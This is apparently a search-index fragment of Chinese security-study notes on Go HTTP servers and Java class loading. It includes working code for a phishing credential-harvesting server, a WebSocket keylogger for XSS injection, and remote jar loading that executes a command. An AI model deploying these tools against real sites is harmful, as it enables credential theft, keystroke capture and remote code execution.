func(ResponseWriter, *Request) \u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello","title":"\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305alice","text":"Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler","title":"\u7b2c\u4e09\u65b9\u5305:alice"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305mux","text":"\u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) }","title":"\u7b2c\u4e09\u65b9\u5305:mux"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305martini","text":"Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6","title":"\u7b2c\u4e09\u65b9\u5305:Martini"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#html\u6a21\u677f","text":"golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) }","title":"HTML\u6a21\u677f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#credential-harvesting-attack\u51ed\u8bc1\u6536\u96c6\u653b\u51fb","text":"\u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d","title":"Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#keylogging-with-websocket\u4f7f\u7528websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668","text":"\u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427","title":"Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#reverse-proxy\u53cd\u5411\u4ee3\u7406","text":"golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } }","title":"Reverse Proxy(\u53cd\u5411\u4ee3\u7406)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b80\u5355\u7684rpc\u670d\u52a1\u5668","text":"\u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. \u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b80\u5355\u7684RPC\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","tags":["java","java\u5b89\u5168"],"text":"ClassLoader\u7c7b\u52a0\u8f7d\u673a\u5236 # Java\u7a0b\u5e8f\u5728\u8fd0\u884c\u524d\u9700\u8981\u5148\u7f16\u8bd1\u6210 class\u6587\u4ef6 \uff0cJava\u7c7b\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.lang.ClassLoader \u52a0\u8f7d\u7c7b\u5b57\u8282\u7801\uff0c ClassLoader \u4f1a\u8c03\u7528JVM\u7684native\u65b9\u6cd5( defineClass0/1/2 )\u6765\u5b9a\u4e49\u4e00\u4e2a java.lang.Class \u5b9e\u4f8b\u3002 ClassLoader # \u5305\u542b\u4ee5\u4e0b\u51e0\u4e2aClassLoader\uff1a - Bootstrap ClassLoader (\u5f15\u5bfc\u7c7b\u52a0\u8f7d\u5668) \u8be5\u7c7b\u52a0\u8f7d\u5668\u5b9e\u73b0\u4e8eJVM\u5c42\uff0c\u91c7\u7528C++\u7f16\u5199 - Extension ClassLoader (\u6269\u5c55\u7c7b\u52a0\u8f7d\u5668) - App ClassLoader (\u7cfb\u7edf\u7c7b\u52a0\u8f7d\u5668) \u9ed8\u8ba4\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader\u7684\u6838\u5fc3\u65b9\u6cd5\u6709\uff1a 1. loadClass (\u52a0\u8f7d\u6307\u5b9a\u7684Java\u7c7b) 2. findClass (\u67e5\u627e\u6307\u5b9a\u7684Java\u7c7b) 3. findLoadedClass (\u67e5\u627eJVM\u5df2\u7ecf\u52a0\u8f7d\u8fc7\u7684\u7c7b) 4. defineClass (\u5b9a\u4e49\u4e00\u4e2aJava\u7c7b) 5. resolveClass (\u94fe\u63a5\u6307\u5b9a\u7684Java\u7c7b) \u7c7b\u52a0\u8f7d\u65b9\u5f0f # \u663e\u5f0f\u52a0\u8f7d # // \u53cd\u5c04\u52a0\u8f7dTestHelloWorld\u793a\u4f8b Class . forName ( \"top.longlone.TestHelloWorld\" ); // ClassLoader\u52a0\u8f7dTestHelloWorld\u793a\u4f8b this . getClass (). getClassLoader (). loadClass ( \"top.longlone.TestHelloWorld\" ); \u9690\u5f0f\u52a0\u8f7d # \u6307\u76f4\u63a5 \u7c7b\u540d.\u65b9\u6cd5\u540d() \u6216 new \u7c7b\u5b9e\u4f8b\u3002 \u7c7b\u52a0\u8f7d\u6d41\u7a0b # \u8c03\u7528 loadClass \u52a0\u8f7d \u8c03\u7528 findLoadedClass \u68c0\u67e5\u662f\u5426\u5df2\u52a0\u8f7d\uff0c\u82e5\u5df2\u52a0\u8f7d\u5219\u76f4\u63a5\u8fd4\u56de\u5df2\u52a0\u8f7d\u7684\u7c7b \u5982\u679c\u521b\u5efaClassLoader\u65f6\u4f20\u5165\u4e86\u7236\u7c7b\u52a0\u8f7d\u5668( new ClassLoader(\u7236\u7c7b\u52a0\u8f7d\u5668) )\u5219\u4f7f\u7528\u7236\u7c7b\u52a0\u8f7d\u5668\u5148\u52a0\u8f7d,\u5426\u5219\u4f7f\u7528JVM\u7684 Bootstrap ClassLoader \u52a0\u8f7d \u82e5\u7236\u7c7b\u52a0\u8f7d\u5668\u65e0\u6cd5\u52a0\u8f7d\u5219\u8c03\u7528\u81ea\u8eab findClass \u52a0\u8f7d \u5982\u679c\u8c03\u7528loadClass\u7684\u65f6\u5019\u4f20\u5165\u7684 resolve \u53c2\u6570\u4e3atrue\uff0c\u90a3\u4e48\u8fd8\u9700\u8981\u8c03\u7528 resolveClass \u65b9\u6cd5\u94fe\u63a5\u7c7b,\u9ed8\u8ba4\u4e3afalse \u52a0\u8f7d\u5931\u8d25\u6216\u8fd4\u56de\u52a0\u8f7d\u540e\u7684 java.lang.Class \u7c7b\u5bf9\u8c61 \u81ea\u5b9a\u4e49ClassLoader # package top.longlone ; import java.util.Base64 ; import java.lang.reflect.Method ; public class ClassLoaderStudy extends ClassLoader { private static final String testClassName = \"top.longlone.Hello\" ; // base64 -w Hello.class private static final byte [] testClassBytes = Base64 . getDecoder (). decode ( \"yv66vgAAADQAHAoACAARBwASCgACABEIABMKAAIAFAoAAgAVBwAWBwAXAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABWhlbGxvAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAZIZWxsbyAMABgAGQwAGgAbAQASdG9wL2xvbmdsb25lL0hlbGxvAQAQamF2YS9sYW5nL09iamVjdAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcAAbEAAAABAAwAAAAGAAEAAAADAAEADQAOAAEACwAAACwAAgACAAAAFLsAAlm3AAMSBLYABSu2AAW2AAawAAAAAQAMAAAABgABAAAABQABAA8AAAACABA=\" ); @Override protected Class <?> findClass ( String name ) throws ClassNotFoundException { if ( name . equals ( testClassName )) { return defineClass ( testClassName , testClassBytes , 0 , testClassBytes . length ); } return super . findClass ( name ); } public static void main ( String [] args ) throws Exception { ClassLoaderStudy loader = new ClassLoaderStudy (); Class testClass = loader . loadClass ( testClassName ); Object o = testClass . newInstance (); Method sayHello = o . getClass (). getMethod ( \"hello\" , String . class ); String longlone = ( String ) sayHello . invoke ( o , \"Longlone\" ); System . out . println ( longlone ); } } URLClassLoader # package top.longlone ; import java.io.ByteArrayOutputStream ; import java.io.InputStream ; import java.net.URL ; import java.net.URLClassLoader ; public class ClassLoaderStudy { public static void main ( String [] args ) throws Exception { URL url = new URL ( \"http://127.0.0.1/cmd.jar\" ); URLClassLoader urlClassLoader = new URLClassLoader ( new URL [] { url }); String cmd = \"whoami\" ; Class <?> cmdClass = urlClassLoader . loadClass ( \"top.longlone.CMD\" ); Process process = ( Process ) cmdClass . getMethod ( \"exec\" , String . class ). invoke ( null , cmd ); InputStream inputStream = process . getInputStream (); ByteArrayOutputStream byteArrayInputStream = new ByteArrayOutputStream (); byte [] bytes = new byte [ 1024 ] ; int a = - 1 ; while (( a = inputStream . read ( bytes )) != - 1 ) { byteArrayInputStream . write ( bytes , 0 , a ); } System . out . println ( byteArrayInputStream . toString ()); } 